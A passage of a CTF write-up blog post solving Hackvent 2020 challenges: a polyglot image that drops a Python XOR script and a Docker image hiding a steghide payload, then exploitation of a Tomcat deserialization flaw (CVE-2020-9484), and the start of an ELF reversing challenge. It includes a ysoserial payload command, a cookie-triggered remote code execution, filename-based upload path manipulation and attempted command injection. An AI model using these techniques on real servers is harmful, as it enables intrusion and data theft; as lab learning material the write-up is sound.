# Hackvent 2020 - leet(ish)

[ctf](/tags#ctf ) [hackvent](/tags#hackvent ) [polyglot](/tags#polyglot )
[binwalk](/tags#binwalk ) [jsnice](/tags#jsnice ) [python](/tags#python )
[chef](/tags#chef ) [docker](/tags#docker ) [docker-tar](/tags#docker-tar )
[steghide](/tags#steghide ) [tomcat](/tags#tomcat )
[cve-2020-9484](/tags#cve-2020-9484 ) [ysoserial](/tags#ysoserial )
[deserialization](/tags#deserialization ) [elf](/tags#elf ) [reverse-
engineering](/tags#reverse-engineering ) [ghidra](/tags#ghidra ) [lru-
cache](/tags#lru-cache ) [ios](/tags#ios ) [itunes](/tags#itunes ) [itunes-
backup2hashcat](/tags#itunes-backup2hashcat ) [fonepaw](/tags#fonepaw )
[rsa](/tags#rsa ) [rsactftool](/tags#rsactftool ) [wireshark](/tags#wireshark
) [pcap](/tags#pcap )  
  
Jan 1, 2021

  * [Hackvent 2020  
easy](/hackvent2020/easy)

  * [medium](/hackvent2020/medium)
  * [hard](/hackvent2020/hard)
  * leet(ish)

![](https://0xdfimages.gitlab.io/img/hackvent2020-leet-cover.png)

The leet challenges started on day 20, but then followed an additional three
hard challenges before the second and final leet one. These were all really
good challenges. My favorite was a binary and a PCAP of an attacker exploiting
the binary, where I needed to reverse the crypto operations in the binary and
the exploit to recover the data that was stolen. I really liked one that was
another polyglot file where an image turned into an HTML page that dropped a
Python script which pull out a docker image containing images that contained a
flag. There was also more web exploitation of a Tomcat deserialization CVE, a
really interesting ELF reversing challenge, and pulling data from an iOS
backup.

## HV20.20

### Challenge

![hv20-ball20](https://0xdfimages.gitlab.io/img/hv20-ball20.png) | HV20.20 Twelve steps of Christmas  
---|---  
Categories: |  ![forensic](../img/hv-cat-forensic.png)FORENSIC  
![programming](../img/hv-cat-programming.png)PROGRAMMING  
![linux](../img/hv-cat-linux.png)LINUX  
Level: | leet  
Author: |  [Bread](https://twitter.com/nonsxd)  
  
> On the twelfth day of Christmas my true love sent to me… twelve rabbits
> a-rebeling, eleven ships a-sailing, ten (twentyfourpointone) pieces
> a-puzzling, and the rest is history.

![img](https://0xdfimages.gitlab.io/img/bfd96926-dd11-4e07-a05a-f6b807570b5a.png)

There is also a hint:

> You should definitely give [Bread’s famous easy perfect fresh rosemary yeast
> black pepper bread](/files/7da737b4-29ba-4f4d-b882-b4ec133bc6c9.txt) a try
> this Christmas!

### Solution

#### HTML Page

Starting with the image, `binwalk` shows embedded files within it, including
an HTML page:

    
    
    $ binwalk bfd96926-dd11-4e07-a05a-f6b807570b5a.png 
    
    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    0             0x0             PNG image, 1632 x 1011, 8-bit/color RGBA, non-interlaced
    41            0x29            HTML document header
    6152          0x1808          Base64 standard index table
    6970          0x1B3A          HTML document footer
    7021          0x1B6D          Zlib compressed data, default compression
    

Looking at the file in a text editor, there’s HTML tags including a block of
JavaScript not too far from the top:

[![image-20201222135219751](https://0xdfimages.gitlab.io/img/image-20201222135219751.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20201222135219751.png)

I spent some time trying to cut the HTML page out of this file and get it to
work, but it turns out the entire file is a
[polyglot](https://en.wikipedia.org/wiki/Polyglot_\(computing\)), functioning
as both an image or an HTML page. After making a copy with the `.html`
extension, it opens in Firefox and shows the picture. Clicking in the picture
causes some whitespace to appear on top of the image (pushing it down the
page) and a text area to appear under it, empty.

#### JavaScript Analysis

View-Source doesn’t seem to work on the page, but looking in the dev console,
the script is there:

![image-20201222135326128](https://0xdfimages.gitlab.io/img/image-20201222135326128.png)

[JSNice](http://jsnice.org/) is a good way to clean up and make readable the
script. There’s a `SHA1` function, which I tested in the console and does
perform an actual SHA1-hash, and a `B64` function which does seem to do legit
base64 encoding.

The `download` function is interesting:

    
    
    function download(uri, id) {
      /** @type {!Element} */
      var a = document.createElement("a");
      a.setAttribute("href", "data:application/octet-stream;base64," + id);
      a.setAttribute("target", "_blank");
      a.setAttribute("download", uri);
      /** @type {string} */
      a.style.display = "none";
      pic.appendChild(a);
      a.click();
      pic.removeChild(a);
    }
    

It creates a link on the page, clicks it, and then removes it. There’s also
script a the bottom that runs the `dID` function on page load.

    
    
    window.onload = function() {
      /** @type {function(): undefined} */
      px.onclick = dID;
    };
    

The `dID` function

    
    
    function dID() {
      /** @type {!Element} */
      cvs = document.createElement("canvas");
      /** @type {string} */
      cvs.crossOrigin = px.crossOrigin = "Anonymous";
      px.parentNode.insertBefore(cvs, px);
      cvs.width = px.width;
      /** @type {string} */
      log.style.width = px.width + "px";
      cvs.height = px.height;
      /** @type {string} */
      log.style.height = "15em";
      /** @type {string} */
      log.style.visibility = "visible";
      var passwd = SHA1(window.location.search.substr(1).split("p=")[1]).toUpperCase();
      /** @type {string} */
      log.value = "TESTING: " + passwd + "\n";
      if (passwd == "60DB15C4E452C71C5670119E7889351242A83505") {
        log.value += "Success\nBit Layer=" + bL + "\nPixel grid=" + gr + "x" + gr + "\nEncoding Density=1 bit per " + gr * gr + " pixels\n";
        /** @type {!Array} */
        var channelOptions = ["Red", "Green", "Blue", "All"];
    ...[snip drawing / decoding]...
        var length = parseInt(bTS(params.join("")));
        g(length);
        log.value += "Total pixels decoded=" + b + "\n";
        log.value += "Decoded data length=" + length + " bytes.\n";
        pix.data = pdt;
        ctx.putImageData(pix, 0, 0);
        var downloadId = B64(bTS(params.join("")));
        /** @type {string} */
        var url = "11.py";
        log.value += "Packaging " + url + " for download\n";
        log.value += "Safari and IE users, save the Base64 data and decode it manually please,Chrome/edge users CORS, move to firefox.\n";
        log.value += 'BASE64 data="' + downloadId + '"\n';
        download(, and , downloadId);
      } else {
        log.value += "failed.\n";
      }
    }
    

This function checks for a password to see if its SHA1 hash matches a static
value, and then does a bunch of decoding and drawing, and eventually calls the
`download` function.

The SHA1 is 60DB15C4E452C71C5670119E7889351242A83505, which
[crackstation](https://crackstation.net/) will break as
“bunnyrabbitsrule4real”.

`passwd` is set here:

    
    
      var passwd = SHA1(window.location.search.substr(1).split("p=")[1]).toUpperCase();
    

That’s getting the url, splitting on `p=`, and returning the right half. I’ll
add `?p=bunnyrabbitsrule4real` to the end of the url, and now when I click on
a rabbit, there’s a popup asking me to open or save `11.py`:

![image-20201222135420496](https://0xdfimages.gitlab.io/img/image-20201222135420496.png)

There’s also some dots added above the bunnies:

[![image-20201222135631528](https://0xdfimages.gitlab.io/img/image-20201222135631528.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20201222135631528.png)

And that textarea has status in it:

[![image-20201222135716181](https://0xdfimages.gitlab.io/img/image-20201222135716181.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20201222135716181.png)

The status text is:

    
    
    TESTING: 60DB15C4E452C71C5670119E7889351242A83505
    Success
    Bit Layer=1
    Pixel grid=2x2
    Encoding Density=1 bit per 4 pixels
    Encoding Channel=All
    Image Resolution=1632x1011
    Total pixels decoded=7352
    Decoded data length=913 bytes.
    Packaging 11.py for download
    Safari and IE users, save the Base64 data and decode it manually please,Chrome/edge users CORS, move to firefox.
    BASE64 data="aW1wb3J0IHN5cwppID0gYnl0ZWFycmF5KG9wZW4oc3lzLmFyZ3ZbMV0sICdyYicpLnJlYWQoKS5zcGxpdChzeXMuYXJndlsyXS5lbmNvZGUoJ3V0Zi04JykgKyBiIlxuIilbLTFdKQpqID0gYnl0ZWFycmF5KGIiUmFiYml0cyBhcmUgc21hbGwgbWFtbWFscyBpbiB0aGUgZmFtaWx5IExlcG9yaWRhZSBvZiB0aGUgb3JkZXIgTGFnb21vcnBoYSAoYWxvbmcgd2l0aCB0aGUgaGFyZSBhbmQgdGhlIHBpa2EpLiBPcnljdG9sYWd1cyBjdW5pY3VsdXMgaW5jbHVkZXMgdGhlIEV1cm9wZWFuIHJhYmJpdCBzcGVjaWVzIGFuZCBpdHMgZGVzY2VuZGFudHMsIHRoZSB3b3JsZCdzIDMwNSBicmVlZHNbMV0gb2YgZG9tZXN0aWMgcmFiYml0LiBTeWx2aWxhZ3VzIGluY2x1ZGVzIDEzIHdpbGQgcmFiYml0IHNwZWNpZXMsIGFtb25nIHRoZW0gdGhlIHNldmVuIHR5cGVzIG9mIGNvdHRvbnRhaWwuIFRoZSBFdXJvcGVhbiByYWJiaXQsIHdoaWNoIGhhcyBiZWVuIGludHJvZHVjZWQgb24gZXZlcnkgY29udGluZW50IGV4Y2VwdCBBbnRhcmN0aWNhLCBpcyBmYW1pbGlhciB0aHJvdWdob3V0IHRoZSB3b3JsZCBhcyBhIHdpbGQgcHJleSBhbmltYWwgYW5kIGFzIGEgZG9tZXN0aWNhdGVkIGZvcm0gb2YgbGl2ZXN0b2NrIGFuZCBwZXQuIFdpdGggaXRzIHdpZGVzcHJlYWQgZWZmZWN0IG9uIGVjb2xvZ2llcyBhbmQgY3VsdHVyZXMsIHRoZSByYWJiaXQgKG9yIGJ1bm55KSBpcywgaW4gbWFueSBhcmVhcyBvZiB0aGUgd29ybGQsIGEgcGFydCBvZiBkYWlseSBsaWZlLWFzIGZvb2QsIGNsb3RoaW5nLCBhIGNvbXBhbmlvbiwgYW5kIGEgc291cmNlIG9mIGFydGlzdGljIGluc3BpcmF0aW9uLiIpCm9wZW4oJzExLjd6JywgJ3diJykud3JpdGUoYnl0ZWFycmF5KFtpW19dIF4galtfJWxlbihqKV0gZm9yIF8gaW4gcmFuZ2UobGVuKGkpKV0pKQA"
    

The data base64-decodes to the same Python file that is offered as a download.

#### Python Script

The Python script is simple, taking two arguments. The first is a file to
open. The second is a string. It will open and read the file, and split it
based on the second input string plus a newline, and take the last result.

It will then xor that result byte by byte with some text in the file, and
write the result to `11.7z`.

    
    
    import sys
    i = bytearray(open(sys.argv[1], 'rb').read().split(sys.argv[2].encode('utf-8') + b"\n")[-1])
    j = bytearray(b"Rabbits are small mammals in the family Leporidae of the order Lagomorpha (along with the hare and the pika). Oryctolagus cuniculus includes the European rabbit species and its descendants, the world's 305 breeds[1] of domestic rabbit. Sylvilagus includes 13 wild rabbit species, among them the seven types of cottontail. The European rabbit, which has been introduced on every continent except Antarctica, is familiar throughout the world as a wild prey animal and as a domesticated form of livestock and pet. With its widespread effect on ecologies and cultures, the rabbit (or bunny) is, in many areas of the world, a part of daily life-as food, clothing, a companion, and a source of artistic inspiration.")
    open('11.7z', 'wb').write(bytearray([i[_] ^ j[_%len(j)] for _ in range(len(i))]))
    

It’s fair to guess that the file is the original image file, but I need a
string to give as the second arg. There’s two ways to find it.

First, this is where the hint recipe comes into play. It’s in the [Chef
esoteric programming
language](https://www.dangermouse.net/esoteric/chef.html). Running it in [this
online interpreter](http://p-helpers.appspot.com/chef/chef.html) produced a
message box:

![image-20201222141230158](https://0xdfimages.gitlab.io/img/image-20201222141230158.png)

The other way to find the key is just to look for strings that end in a
newline that might make a good key. This command returned a list of strings
that all end in newline with between eight and fifteen printable characters
proceeding it:

    
    
    $ strings bfd96926-dd11-4e07-a05a-f6b807570b5a.png | grep -oP '\w{8,15}$' | less
    

Looking through the list, “breadbread” is in there.

Running the Python script with these inputs creates `11.7z`, and it is in fact
a a 7-zip archive:

    
    
    $ python3 11.py bfd96926-dd11-4e07-a05a-f6b807570b5a.png breadbread
    $ file 11.7z 
    11.7z: 7-zip archive data, version 0.4
    

#### Docker Image

Extracting this archive with `7z x 11.7z` produces a `.tar` archive, `11.tar`.
Extracting that with `tar xvf 11.tar` produces a handful of files:

    
    
    ./1c63adeddbefb62258429939a0247538742b10dfd7d95cdc55c5ab76428ec974/json
    ./1c63adeddbefb62258429939a0247538742b10dfd7d95cdc55c5ab76428ec974/layer.tar
    ./1c63adeddbefb62258429939a0247538742b10dfd7d95cdc55c5ab76428ec974/VERSION
    ./1d66b052bd26bb9725d5c15a5915bed7300e690facb51465f2d0e62c7d644649.json
    ./7184b9ccb527dcaef747979066432e891b7487867de2bb96790a01b87a1cc50e/json
    ./7184b9ccb527dcaef747979066432e891b7487867de2bb96790a01b87a1cc50e/layer.tar
    ./7184b9ccb527dcaef747979066432e891b7487867de2bb96790a01b87a1cc50e/VERSION
    ./ab2b751e14409f169383b5802e61764fb4114839874ff342586ffa4f968de0c1/json
    ./ab2b751e14409f169383b5802e61764fb4114839874ff342586ffa4f968de0c1/layer.tar
    ./ab2b751e14409f169383b5802e61764fb4114839874ff342586ffa4f968de0c1/VERSION
    ./bc7f356b13fa5818f568082beeb3bfc0f0fe9f9424163a7642bfdc12ba5ba82b/json
    ./bc7f356b13fa5818f568082beeb3bfc0f0fe9f9424163a7642bfdc12ba5ba82b/layer.tar
    ./bc7f356b13fa5818f568082beeb3bfc0f0fe9f9424163a7642bfdc12ba5ba82b/VERSION
    ./bfd96926-dd11-4e07-a05a-f6b807570b5a.png
    ./e0f45634ac647ef43d22d4ea46fce543fc1d56ed338c72c712a6bc4ddb96fd46/json
    ./e0f45634ac647ef43d22d4ea46fce543fc1d56ed338c72c712a6bc4ddb96fd46/layer.tar
    ./e0f45634ac647ef43d22d4ea46fce543fc1d56ed338c72c712a6bc4ddb96fd46/VERSION
    ./manifest.json
    ./repositories
    

Some googling with these terms will show this is a file related to Docker,
specifically the output of the [docker
save](https://stackoverflow.com/questions/36925261/what-is-the-difference-
between-import-and-load-in-docker) command. The `manifest.json` describes the
config
(`1d66b052bd26bb9725d5c15a5915bed7300e690facb51465f2d0e62c7d644649.json`) and
points to all the layers. I’ll come back to this config later.

I can [load](https://docs.docker.com/engine/reference/commandline/image_load/)
this `.tar` directly into Docker:

    
    
    # service docker start  # make sure the Docker daemon is running
    # docker image load --input 11.tar
    ace0eda3e3be: Loading layer [==================================================>]  5.843MB/5.843MB
    f9a8379022de: Loading layer [==================================================>]  5.838MB/5.838MB
    1c50319140b2: Loading layer [==================================================>]  12.29kB/12.29kB
    5f70bf18a086: Loading layer [==================================================>]  1.024kB/1.024kB
    56553910173d: Loading layer [==================================================>]  6.078MB/6.078MB
    Loaded image: 12stepsofchristmas:11
    
    root@kali# docker images
    REPOSITORY           TAG                      IMAGE ID            CREATED             SIZE
    12stepsofchristmas   11                       1d66b052bd26        12 days ago         17.3MB
    

It now shows up in my list of local images:

    
    
    # docker image ls
    REPOSITORY           TAG                      IMAGE ID            CREATED             SIZE
    12stepsofchristmas   11                       1d66b052bd26        2 weeks ago         17.3MB
    

To get a shell, I’ll run the image with `-it`:

    
    
    # docker run -it 12stepsofchristmas:11 sh
    ~ $ id
    uid=1000(bread) gid=1000(bread)
    

There’s a single directory in `/home/bread`, and bread can’t get into it or
change it:

    
    
    ~ $ ls
    flimflam
    ~ $ cd flimflam/
    sh: cd: can't cd to flimflam/: Permission denied
    ~ $ ls -l
    total 4
    d---------    2 root     bread         4096 Dec  8 03:41 flimflam
    ~ $ chmod 777 flimflam/
    chmod: flimflam/: Operation not permitted
    

I can just exit the container and enter again as root:

    
    
    # docker run -u root -it 12stepsofchristmas:11 sh
    /home/bread # cd flimflam/
    /home/bread/flimflam #
    

#### Assemble Image

The `flimflam` directory contains 241 files, each containing 24,400 bytes
(except the last one is smaller) of hex data:

    
    
    /home/bread/flimflam # ls
    flomaa  flomam  flomay  flombk  flombw  flomci  flomcu  flomdg  flomds  flomee  flomeq  flomfc  flomfo  flomga  flomgm  flomgy  flomhk  flomhw  flomii  flomiu  flomjg
    flomab  floman  flomaz  flombl  flombx  flomcj  flomcv  flomdh  flomdt  flomef  flomer  flomfd  flomfp  flomgb  flomgn  flomgz  flomhl  flomhx  flomij  flomiv
    flomac  flomao  flomba  flombm  flomby  flomck  flomcw  flomdi  flomdu  flomeg  flomes  flomfe  flomfq  flomgc  flomgo  flomha  flomhm  flomhy  flomik  flomiw
    flomad  flomap  flombb  flombn  flombz  flomcl  flomcx  flomdj  flomdv  flomeh  flomet  flomff  flomfr  flomgd  flomgp  flomhb  flomhn  flomhz  flomil  flomix
    flomae  flomaq  flombc  flombo  flomca  flomcm  flomcy  flomdk  flomdw  flomei  flomeu  flomfg  flomfs  flomge  flomgq  flomhc  flomho  flomia  flomim  flomiy
    flomaf  flomar  flombd  flombp  flomcb  flomcn  flomcz  flomdl  flomdx  flomej  flomev  flomfh  flomft  flomgf  flomgr  flomhd  flomhp  flomib  flomin  flomiz
    flomag  flomas  flombe  flombq  flomcc  flomco  flomda  flomdm  flomdy  flomek  flomew  flomfi  flomfu  flomgg  flomgs  flomhe  flomhq  flomic  flomio  flomja
    flomah  flomat  flombf  flombr  flomcd  flomcp  flomdb  flomdn  flomdz  flomel  flomex  flomfj  flomfv  flomgh  flomgt  flomhf  flomhr  flomid  flomip  flomjb
    flomai  flomau  flombg  flombs  flomce  flomcq  flomdc  flomdo  flomea  flomem  flomey  flomfk  flomfw  flomgi  flomgu  flomhg  flomhs  flomie  flomiq  flomjc
    flomaj  flomav  flombh  flombt  flomcf  flomcr  flomdd  flomdp  flomeb  flomen  flomez  flomfl  flomfx  flomgj  flomgv  flomhh  flomht  flomif  flomir  flomjd
    flomak  flomaw  flombi  flombu  flomcg  flomcs  flomde  flomdq  flomec  flomeo  flomfa  flomfm  flomfy  flomgk  flomgw  flomhi  flomhu  flomig  flomis  flomje
    flomal  flomax  flombj  flombv  flomch  flomct  flomdf  flomdr  flomed  flomep  flomfb  flomfn  flomfz  flomgl  flomgx  flomhj  flomhv  flomih  flomit  flomjf
    /home/bread/flimflam # head flomaa
    ffd8ffe000104a46494600010100000100010000ffdb0043000101010101
    010101010101010102020302020202020403030203050405050504040405
    0607060505070604040609060708080808080506090a09080a07080808ff
    db0043010101010202020402020408050405080808080808080808080808
    080808080808080808080808080808080808080808080808080808080808
    0808080808080808ffc000110808dc0fc003012200021101031101ffc400
    1f0000010501010101010100000000000000000102030405060708090a0b
    ffc400b5100002010303020403050504040000017d010203000411051221
    31410613516107227114328191a1082342b1c11552d1f02433627282090a
    161718191a25262728292a3435363738393a434445464748494a53545556
    

This container doesn’t have `xxd` with the `-r` option, so I decided to exfil
all the files out. First I created an archive:

    
    
    /home/bread # tar -czf ff.tar.gz flimflam/
    /home/bread # ls
    ff.tar.gz  flimflam
    

Now just copy it out:

    
    
    # docker cp 26e0b063e937:/home/bread/ff.tar.gz .
    # tar zxf ff.tar.gz
    

At this point I could go back to the config file from the container image, but
I managed to guess the next step without that. I used `cat` to dump all the
files into `xxd -r -p` to convert from hex to binary, and the resulting file
was an image:

    
    
    # cat * | xxd -r -p > flimflam.jpg
    # file flimflam.jpg 
    flimflam.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 4032x2268, components 3
    

More bunnies!

![](https://0xdfimages.gitlab.io/img/hv20-20-flimflam.jpg)

#### StegHide

At this point, I need to look at how this image was created. In the docker
tarball, there’s a json config file (I’ll `cat` it into `jq .` to pretty print
it):

    
    
    {
      "architecture": "amd64",
      "config": {
        "User": "bread",
        "Env": [
          "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
        ],
        "Cmd": [
          "/bin/sh",
          "-c",
          "tail -f /dev/null"
        ],
        "WorkingDir": "/home/bread/",
        "ArgsEscaped": true,
        "OnBuild": null
      },
      "created": "2020-12-08T14:41:59.119577934+11:00",
      "history": [
        {
          "created": "2020-10-22T02:19:24.33416307Z",
          "created_by": "/bin/sh -c #(nop) ADD file:f17f65714f703db9012f00e5ec98d0b2541ff6147c2633f7ab9ba659d0c507f4 in / "
        },
        {
          "created": "2020-10-22T02:19:24.499382102Z",
          "created_by": "/bin/sh -c #(nop)  CMD [\"/bin/sh\"]",
          "empty_layer": true
        },
        {
          "created": "2020-12-08T14:41:33.015297112+11:00",
          "created_by": "RUN /bin/sh -c apk update && apk add  --update-cache --repository http://dl-3.alpinelinux.org/alpine/edge/testing/ --allow-untrusted steghide xxd # buildkit",
          "comment": "buildkit.dockerfile.v0"
        },
        {
          "created": "2020-12-08T14:41:33.4777984+11:00",
          "created_by": "RUN /bin/sh -c adduser --disabled-password --gecos '' bread # buildkit",
          "comment": "buildkit.dockerfile.v0"
        },
        {
          "created": "2020-12-08T14:41:33.487504964+11:00",
          "created_by": "WORKDIR /home/bread/",
          "comment": "buildkit.dockerfile.v0"
        },
        {
          "created": "2020-12-08T14:41:59.119577934+11:00",
          "created_by": "RUN /bin/sh -c cp /tmp/t/bunnies12.jpg bunnies12.jpg && steghide embed -e loki97 ofb -z 9 -p \"bunnies12.jpg\\\\\\\" -ef /tmp/t/hidden.png -p \\\\\\\"SecretPassword\" -N -cf \"bunnies12.jpg\" -ef \"/tmp/t/hidden.png\" && mkdir /home/bread/flimflam && xxd -p bunnies12.jpg > flimflam/snoot.hex && rm -rf bunnies12.jpg && split -l 400 /home/bread/flimflam/snoot.hex /home/bread/flimflam/flom && rm -rf /home/bread/flimflam/snoot.hex && chmod 0000 /home/bread/flimflam && apk del steghide xxd # buildkit",
          "comment": "buildkit.dockerfile.v0"
        },
        {
          "created": "2020-12-08T14:41:59.119577934+11:00",
          "created_by": "USER bread",
          "comment": "buildkit.dockerfile.v0",
          "empty_layer": true
        },
        {
          "created": "2020-12-08T14:41:59.119577934+11:00",
          "created_by": "CMD [\"/bin/sh\" \"-c\" \"tail -f /dev/null\"]",
          "comment": "buildkit.dockerfile.v0",
          "empty_layer": true
        }
      ],
      "os": "linux",
      "rootfs": {
        "type": "layers",
        "diff_ids": [
          "sha256:ace0eda3e3be35a979cec764a3321b4c7d0b9e4bb3094d20d3ff6782961a8d54",
          "sha256:f9a8379022de9f439ace90e2104d99b33559d08c2e21255914d27fdc0051e0af",
          "sha256:1c50319140b222d353c0d165923ddc72c017da86dc8f56fa77826c53eba9c20d",
          "sha256:5f70bf18a086007016e948b04aed3b82103a36bea41755b6cddfaf10ace3c6ef",
          "sha256:56553910173dbbe9836893f8e0a081a58208ad47385b66fbefad69caa5e687e1"
        ]
      }
    }
    

One of the layers was created by the following command:

    
    
    "created_by": "RUN /bin/sh -c cp /tmp/t/bunnies12.jpg bunnies12.jpg && steghide embed -e loki97 ofb -z 9 -p \"bunnies12.jpg\\\\\\\" -ef /tmp/t/hidden.png -p \\\\\\\"SecretPassword\" -N -cf \"bunnies12.jpg\" -ef \"/tmp/t/hidden.png\" && mkdir /home/bread/flimflam && xxd -p bunnies12.jpg > flimflam/snoot.hex && rm -rf bunnies12.jpg && split -l 400 /home/bread/flimflam/snoot.hex /home/bread/flimflam/flom && rm -rf /home/bread/flimflam/snoot.hex && chmod 0000 /home/bread/flimflam && apk del steghide xxd # buildkit"
    

Right away I can see it’s using `steghide` to embed something in an image, and
then using `xxd` to hex encode it and `split` to break it into parts. Then it
deletes things. I’ll clean up the escapes by removing the first layer of `""`
and adding new lines between the commands:

    
    
    cp /tmp/t/bunnies12.jpg bunnies12.jpg && 
    steghide embed -e loki97 ofb -z 9 -p "bunnies12.jpg\" -ef /tmp/t/hidden.png -p \"SecretPassword" -N -cf "bunnies12.jpg" -ef "/tmp/t/hidden.png" && 
    mkdir /home/bread/flimflam && 
    xxd -p bunnies12.jpg > flimflam/snoot.hex && 
    rm -rf bunnies12.jpg && 
    split -l 400 /home/bread/flimflam/snoot.hex /home/bread/flimflam/flom && 
    rm -rf /home/bread/flimflam/snoot.hex && 
    chmod 0000 /home/bread/flimflam && 
    apk del steghide xxd
    

Given that I’ve recovered the image, what’s left is the `steghide`. I’ll need
to be careful as I break out the command syntax here, as there’s a trick in
it, but the syntax highlighting above actually makes it really clear. The
password for the steg is `bunnies12.jpg\" -ef /tmp/t/hidden.png -p
\"SecretPassword`. I can paste it in when prompted, or add back some escapes
and enter it at the command line:

    
    
    # steghide extract -sf flimflam.jpg -xf hidden.png
    Enter passphrase: 
    wrote extracted data to "hidden.png".
    # steghide extract -sf flimflam.jpg -xf hidden.jpg -p "bunnies12.jpg\\\" -ef /tmp/t/hidden.png -p \\\"SecretPassword"
    the file "hidden.png" does already exist. overwrite ? (y/n) y
    wrote extracted data to "hidden.png".
    

This image has a QRCode:

![](https://0xdfimages.gitlab.io/img/hv20-20-flag.png)

Scanning that or uploading to [zxing.org](https://zxing.org/w/decode.jspx)
gives the flag.

**Flag:`HV20{My_pr3c10u5_my_r363x!!!,_7hr0w_17_1n70_7h3_X1._-_64l4dr13l}`**

## HV20.21

### Challenge

![hv20-ball21](https://0xdfimages.gitlab.io/img/hv20-ball21.png) | HV20.21 Threatened Cat  
---|---  
Categories: |  ![web security](../img/hv-cat-web_security.png)WEB SECURITY  
![exploitation](../img/hv-cat-exploitation.png)EXPLOITATION  
Level: | hard  
Author: |  inik   
  
> You can feed this cat with many different things, but only a certain kind of
> file can endanger the cat.
>
> Do you find that kind of files? And if yes, can you use it to disclose the
> flag? Ahhh, by the way: The cat likes to hide its stash in
> `/usr/bin/catnip.txt`.
>
> **Note** : The cat is currently in hibernation and will take a few seconds
> to wake up.

There’s a link to start an instance of the webserver.

### Solution

#### Enumeration

Visiting the url
`http://afd7ca93-d618-4f68-adf9-b55b8bcddbc1.idocker.vuln.land`redirects to
both https and `/cat/`. The site is an ASCII cat with an upload form:

![](https://0xdfimages.gitlab.io/img/hv20-21-cat-page.png)

The response headers don’t give anything away as far as the server type:

    
    
    HTTP/1.1 200 OK
    Accept-Ranges: bytes
    Content-Length: 100
    Content-Type: text/html
    Date: Mon, 21 Dec 2020 23:48:49 GMT
    Etag: W/"100-1605869035000"
    Last-Modified: Fri, 20 Nov 2020 10:43:55 GMT
    Connection: close
    

On uploading files to the server, the cat will report back about them:

![image-20201222155904638](https://0xdfimages.gitlab.io/img/image-20201222155904638.png)

If the upload is too big, the site rejects it:

![image-20201222155756811](https://0xdfimages.gitlab.io/img/image-20201222155756811.png)

#### Things That Didn’t Work

Given the challenge didn’t suggest the VPN (so reverse shell not needed) and
gives the file location, I had a few ideas of things to go after.

  * I checked to see if the server was PHP by trying to visit `index.php` in the `/cat/` directory, but it just returned 404 with a redirect to `/cat/`. Given the file upload, I tried a PHP webshell anyway, but visiting the url just returned the PHP code, no execution.

  * Given the information about the content of the file, I thought perhaps the `file` command was being used on it. I tried some command injections by changing the file name to things like “a.php; id”, but the file name seemed to just be that filename, no injection.

  * The page reports that the uploaded files are saved to `/usr/local/uploads`, which also seems to be served from `/cat/files/`. I tried a lot of things that might allow me to read outside of that directory, but anything in the GET request to get files like that seemed to return 400 Bad Request. I was able to upload files to anywhere on the system that this user could write by changing the form header like so:
    
        -----------------------------128130095113367998791276393785
    Content-Disposition: form-data; name="file"; filename="/tmp/kitten-large.png"
    Content-Type: image/png
    

It then shows up as saved to this location, and but it’s not in my list of
files to access:

![image-20201222161255139](https://0xdfimages.gitlab.io/img/image-20201222161255139.png)

#### CVE-2020-9484

When I treid to check if `index.php` would load that the root, the page
crashed differently:

![image-20201222161648482](https://0xdfimages.gitlab.io/img/image-20201222161648482.png)

The server is running Apache Tomcat (fits the cat theme), and the version is
9.0.34. Googling that version of Tomcat led to CVE-2020-9484, an exploit I
used against a HTB machine recently. [This
post](https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-
cve-2020-9484-write-up-and-exploit/) gives a really nice writeup, but the
short version is that if I can upload a file and then reference the relative
path to that file in a cookie, I can get Tomcat to deserialize that file,
which is a way to gain code execution.

To build a payload, I’ll use
[yososerial](https://github.com/frohoff/ysoserial) to generate a serialized
Java payload. You have to find a payload type (there are many to try) and pick
a command to run. A successful RCE will crash the current thread, so no output
is returned. Given that, I’ll have the exploit copy the flag file into the
`/usr/local/uploads/` directory. I’ll try different payloads until one works
(I’ve had the most luck with the `CommonCollections` series):

    
    
    $ java -jar /opt/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections2 'cp /usr/bin/catnip.txt /usr/local/uploads/0xdf.txt' > catnip.session
    

On uploading that, the cat reports to be threatened:

![image-20201222162624905](https://0xdfimages.gitlab.io/img/image-20201222162624905.png)

I’ll turn on Burp Proxy with Intercept on, and refresh that main page. I’ll
edit the cookie value and send it on:

![image-20201222162753480](https://0xdfimages.gitlab.io/img/image-20201222162753480.png)

The page crashes:

![image-20201222162822198](https://0xdfimages.gitlab.io/img/image-20201222162822198.png)

But on going back to the main page, `0xdf.txt` is now listed in the files:

![image-20201222163217337](https://0xdfimages.gitlab.io/img/image-20201222163217337.png)

Downloading the file gives the flag:

    
    
    $ curl -L http://afd7ca93-d618-4f68-adf9-b55b8bcddbc1.idocker.vuln.land/cat/files/0xdf.txt
    HV20{!D3s3ri4liz4t10n_rulz!}
    

**Flag:`HV20{!D3s3ri4liz4t10n_rulz!}`**

## HV20.22

### Challenge

![hv20-ball22](https://0xdfimages.gitlab.io/img/hv20-ball22.png) | HV20.22 Padawanlock  
---|---  
Categories: |  ![reverse engineering](../img/hv-cat-reverse_engineering.png)REVERSE ENGINEERING   
Level: | hard  
Author: |  inik   
  
> A new apprentice Elf heard about “Configuration as Code”. When he had to
> solve the problem to protected a secret he came up with this “very
> sophisticated padlock”.

There’s a [zip
archive](https://drive.google.com/u/1/uc?id=1Db9lZda6PXW_drHE_ElVPpcGtVGeJXWy&export=download)
containing an ELF binary.

### Solution

#### Running It

Running the binary prompts for a pin, and then prints a string that looks kind
of flag-like but isn’t a flag:

    
    
    $ ./padawanlock 
    PIN (6 digits): 000000
    Unlocked secret is: {WE_HAVE_NO_CHOICE,_GENERAL_CALRISSIAN!_OUR_CRUISERS_CANT_REPEL_FIREPOWER_OF_THAT_MAGNITUDE!}
    $  ./padawanlock 
    PIN (6 digits): 013370    
    Unlocked secret is: LE_IS_ME_GOING_BACK_DER!}
    

Given that there are 1,000,000 possible inputs, it’ll take too long to try
them all.

#### Static Analysis

Opening the file in Ghidra, there aren’t too many functions. A strings search
identifies the function at 0x111e0, which I’ll call `main`:

    
    
    void main(void)
    
    {
      char *__nptr;
      int int_input;
      
